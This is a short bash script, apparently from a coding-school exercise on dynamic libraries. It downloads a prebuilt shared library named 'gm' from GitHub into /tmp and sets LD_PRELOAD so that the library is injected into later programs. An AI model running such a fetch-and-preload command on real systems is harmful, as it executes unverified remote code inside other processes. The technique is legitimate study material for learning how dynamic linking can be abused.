#!/bin/bash
wget -P /tmp https://github.com/alx-tools/0x18.c/raw/master/gm
export LD_PRELOAD=/tmp/gm
